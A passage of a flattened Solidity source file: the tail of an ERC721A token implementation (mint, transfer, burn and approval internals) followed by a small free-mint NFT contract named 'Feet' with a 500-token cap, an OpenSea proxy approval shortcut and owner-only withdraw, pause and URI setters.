1089         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1090         unchecked {
1091             _addressData[to].balance += uint64(quantity);
1092             _addressData[to].numberMinted += uint64(quantity);
1093 
1094             _ownerships[startTokenId].addr = to;
1095             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1096 
1097             uint256 updatedIndex = startTokenId;
1098             uint256 end = updatedIndex + quantity;
1099 
1100             if (safe && to.isContract()) {
1101                 do {
1102                     emit Transfer(address(0), to, updatedIndex);
1103                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1104                         revert TransferToNonERC721ReceiverImplementer();
1105                     }
1106                 } while (updatedIndex != end);
1107                 // Reentrancy protection
1108                 if (_currentIndex != startTokenId) revert();
1109             } else {
1110                 do {
1111                     emit Transfer(address(0), to, updatedIndex++);
1112                 } while (updatedIndex != end);
1113             }
1114             _currentIndex = updatedIndex;
1115         }
1116         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1117     }
1118 
1119     /**
1120      * @dev Transfers `tokenId` from `from` to `to`.
1121      *
1122      * Requirements:
1123      *
1124      * - `to` cannot be the zero address.
1125      * - `tokenId` token must be owned by `from`.
1126      *
1127      * Emits a {Transfer} event.
1128      */
1129     function _transfer(
1130         address from,
1131         address to,
1132         uint256 tokenId
1133     ) private {
1134         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1135 
1136         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1137             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1138             getApproved(tokenId) == _msgSender());
1139 
1140         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1141         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1142         if (to == address(0)) revert TransferToZeroAddress();
1143 
1144         _beforeTokenTransfers(from, to, tokenId, 1);
1145 
1146         // Clear approvals from the previous owner
1147         _approve(address(0), tokenId, prevOwnership.addr);
1148 
1149         // Underflow of the sender's balance is impossible because we check for
1150         // ownership above and the recipient's balance can't realistically overflow.
1151         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1152         unchecked {
1153             _addressData[from].balance -= 1;
1154             _addressData[to].balance += 1;
1155 
1156             _ownerships[tokenId].addr = to;
1157             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1158 
1159             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1160             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1161             uint256 nextTokenId = tokenId + 1;
1162             if (_ownerships[nextTokenId].addr == address(0)) {
1163                 // This will suffice for checking _exists(nextTokenId),
1164                 // as a burned slot cannot contain the zero address.
1165                 if (nextTokenId < _currentIndex) {
1166                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1167                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1168                 }
1169             }
1170         }
1171 
1172         emit Transfer(from, to, tokenId);
1173         _afterTokenTransfers(from, to, tokenId, 1);
1174     }
1175 
1176     /**
1177      * @dev Destroys `tokenId`.
1178      * The approval is cleared when the token is burned.
1179      *
1180      * Requirements:
1181      *
1182      * - `tokenId` must exist.
1183      *
1184      * Emits a {Transfer} event.
1185      */
1186     function _burn(uint256 tokenId) internal virtual {
1187         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1188 
1189         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1190 
1191         // Clear approvals from the previous owner
1192         _approve(address(0), tokenId, prevOwnership.addr);
1193 
1194         // Underflow of the sender's balance is impossible because we check for
1195         // ownership above and the recipient's balance can't realistically overflow.
1196         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1197         unchecked {
1198             _addressData[prevOwnership.addr].balance -= 1;
1199             _addressData[prevOwnership.addr].numberBurned += 1;
1200 
1201             // Keep track of who burned the token, and the timestamp of burning.
1202             _ownerships[tokenId].addr = prevOwnership.addr;
1203             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1204             _ownerships[tokenId].burned = true;
1205 
1206             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1207             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1208             uint256 nextTokenId = tokenId + 1;
1209             if (_ownerships[nextTokenId].addr == address(0)) {
1210                 // This will suffice for checking _exists(nextTokenId),
1211                 // as a burned slot cannot contain the zero address.
1212                 if (nextTokenId < _currentIndex) {
1213                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1214                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1215                 }
1216             }
1217         }
1218 
1219         emit Transfer(prevOwnership.addr, address(0), tokenId);
1220         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1221 
1222         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1223         unchecked {
1224             _burnCounter++;
1225         }
1226     }
1227 
1228     /**
1229      * @dev Approve `to` to operate on `tokenId`
1230      *
1231      * Emits a {Approval} event.
1232      */
1233     function _approve(
1234         address to,
1235         uint256 tokenId,
1236         address owner
1237     ) private {
1238         _tokenApprovals[tokenId] = to;
1239         emit Approval(owner, to, tokenId);
1240     }
1241 
1242     /**
1243      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1244      *
1245      * @param from address representing the previous owner of the given token ID
1246      * @param to target address that will receive the tokens
1247      * @param tokenId uint256 ID of the token to be transferred
1248      * @param _data bytes optional data to send along with the call
1249      * @return bool whether the call correctly returned the expected magic value
1250      */
1251     function _checkContractOnERC721Received(
1252         address from,
1253         address to,
1254         uint256 tokenId,
1255         bytes memory _data
1256     ) private returns (bool) {
1257         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1258             return retval == IERC721Receiver(to).onERC721Received.selector;
1259         } catch (bytes memory reason) {
1260             if (reason.length == 0) {
1261                 revert TransferToNonERC721ReceiverImplementer();
1262             } else {
1263                 assembly {
1264                     revert(add(32, reason), mload(reason))
1265                 }
1266             }
1267         }
1268     }
1269 
1270     /**
1271      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1272      * And also called before burning one token.
1273      *
1274      * startTokenId - the first token id to be transferred
1275      * quantity - the amount to be transferred
1276      *
1277      * Calling conditions:
1278      *
1279      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1280      * transferred to `to`.
1281      * - When `from` is zero, `tokenId` will be minted for `to`.
1282      * - When `to` is zero, `tokenId` will be burned by `from`.
1283      * - `from` and `to` are never both zero.
1284      */
1285     function _beforeTokenTransfers(
1286         address from,
1287         address to,
1288         uint256 startTokenId,
1289         uint256 quantity
1290     ) internal virtual {}
1291 
1292     /**
1293      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1294      * minting.
1295      * And also called after one token has been burned.
1296      *
1297      * startTokenId - the first token id to be transferred
1298      * quantity - the amount to be transferred
1299      *
1300      * Calling conditions:
1301      *
1302      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1303      * transferred to `to`.
1304      * - When `from` is zero, `tokenId` has been minted for `to`.
1305      * - When `to` is zero, `tokenId` has been burned by `from`.
1306      * - `from` and `to` are never both zero.
1307      */
1308     function _afterTokenTransfers(
1309         address from,
1310         address to,
1311         uint256 startTokenId,
1312         uint256 quantity
1313     ) internal virtual {}
1314 }
1315 
1316 
1317 // File contracts/Feet.sol
1318 
1319 
1320 contract Feet is ERC721A, Owneable {
1321 
1322     string public baseURI = "ipfs://QmXvVc6sMEwR1497qpGHdpWYPWrifjrdmACHqebDwqFfV3/";
1323     string public contractURI = "ipfs://QmbxeFVpzFvGMaxuwESS2LKkJFXw7bweh1SBJYgmhDDA5W";
1324     string public constant baseExtension = ".json";
1325     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1326 
1327     uint256 public constant MAX_PER_TX_FREE = 0;
1328     uint256 public constant FREE_MAX_SUPPLY = 0;
1329     uint256 public constant MAX_PER_TX = 2;
1330     uint256 public constant MAX_SUPPLY = 500;
1331     uint256 public constant price = 0 ether;
1332 
1333     bool public paused = true;
1334 
1335     constructor() ERC721A("Feet", "feet") {}
1336 
1337     function mint(uint256 _amount) external payable {
1338         address _caller = _msgSender();
1339         require(!paused, "Paused");
1340         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1341         require(_amount > 0, "No 0 mints");
1342         require(tx.origin == _caller, "No contracts");
1343         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1344         
1345         _safeMint(_caller, _amount);
1346     }
1347 
1348     function isApprovedForAll(address owner, address operator)
1349         override
1350         public
1351         view
1352         returns (bool)
1353     {
1354         // Whitelist OpenSea proxy contract for easy trading.
1355         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1356         if (address(proxyRegistry.proxies(owner)) == operator) {
1357             return true;
1358         }
1359 
1360         return super.isApprovedForAll(owner, operator);
1361     }
1362 
1363     function _startTokenId() internal override view virtual returns (uint256) {
1364         return 1;
1365     }
1366 
1367     function withdraw() external onlyOwner {
1368         uint256 balance = address(this).balance;
1369         (bool success, ) = _msgSender().call{value: balance}("");
1370         require(success, "Failed to send");
1371     }
1372 
1373     function setupOS() external onlyOwner {
1374         _safeMint(_msgSender(), 1);
1375     }
1376 
1377     function pause(bool _state) external onlyOwner {
1378         paused = _state;
1379     }
1380 
1381     function setBaseURI(string memory baseURI_) external onlyOwner {
1382         baseURI = baseURI_;
1383     }
1384 
1385     function setContractURI(string memory _contractURI) external onlyOwner {
1386         contractURI = _contractURI;
1387     }
1388 
1389     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1390         require(_exists(_tokenId), "Token does not exist.");
1391         return bytes(baseURI).length > 0 ? string(
1392             abi.encodePacked(
1393               baseURI,
1394               Strings.toString(_tokenId),
1395               baseExtension
1396             )
1397         ) : "";
1398     }
1399 }
1400 
1401 contract OwnableDelegateProxy { }
1402 contract ProxyRegistry {
1403     mapping(address => OwnableDelegateProxy) public proxies;
1404 }